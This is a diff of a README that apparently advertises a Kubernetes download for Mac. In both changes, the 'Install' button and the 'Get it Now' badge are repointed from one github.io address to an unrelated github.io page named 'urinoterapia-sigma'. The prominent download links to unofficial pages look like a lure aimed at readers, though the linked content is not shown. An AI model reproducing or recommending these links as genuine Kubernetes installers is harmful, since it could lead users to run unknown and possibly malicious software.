@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/kubernetes)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/kubernetes)
 
 </div>
 
@@ -81,7 +81,7 @@ Local Kubernetes development on Mac provides the most significant benefit throug
 
 <p align="center">
 
-[![Get it Now Kubernetes](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/kubernetes)
+[![Get it Now Kubernetes](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/kubernetes)
 
 </p>
 
